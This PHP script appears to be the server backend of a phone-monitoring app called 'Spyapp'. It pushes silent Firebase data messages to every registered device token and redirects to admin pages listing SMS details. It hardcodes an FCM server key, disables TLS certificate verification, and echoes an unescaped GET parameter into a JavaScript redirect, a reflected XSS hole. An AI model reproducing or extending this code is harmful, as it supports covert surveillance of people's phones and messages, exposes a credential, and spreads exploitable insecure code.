<?php
date_default_timezone_set("Asia/Kolkata");
    require_once("classes/dbo.class.php");
   

        define('API_ACCESS_KEY','AAAATMmJnn0:APA91bFXO7ufQev1BLrFrF6ptNrdaivj3yBlNPx04OvacOEV4Gzkt26zS1Vz3PgGxNUR2oJL89fVkhsaallrZT106w4Rvi2E9kwnsiVKUuJLpFjbHhfKT1xU1j4vv0nODAR6chS6UPMS');
        $sms1 = $db->dml("delete from tbl_status",array());
   
        $sms = $db->get("select * from tbl_token order by token_id desc",array());
   
   
        foreach($sms as $res)
        {
                $date=date('Y-m-d H:i:s');
                $sms = $db->dml("update tbl_cron set cron_date='$date'",array());
            
            	$token = $res['token'];
            	$fcmUrl = 'https://fcm.googleapis.com/fcm/send';
            	$notification = [
                    'title' =>"Spyapp",
                    'body' => "Spyapp Message"
                ];
                $no=rand();
                $extraNotificationData = ["title" => "Spyapp","spyapp_message" =>$no];
        
                $fcmNotification = [
                    'to'=> $token, 
                    'data' => $extraNotificationData
                ];
        
                $headers = [
                    'Authorization: key=' . API_ACCESS_KEY,
                    'Content-Type: application/json'
                ];


                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL,$fcmUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fcmNotification));
                $result = curl_exec($ch);
                //print_r($result);
                if($result)
                {
                   // echo "Success";
                }
                curl_close($ch);
                
                if($_GET['ip']!="")
                {
                ?>
                <script>window.location.href="https://jmart.xyz/admin/sms_details.php?ip=<?php echo $_GET['ip'];?>";</script>
                <?php
                }
                else
                {
                ?>
                <script>window.location.href="https://jmart.xyz/admin/sms.php";</script>
                <?php
                }
    
        }
        
?>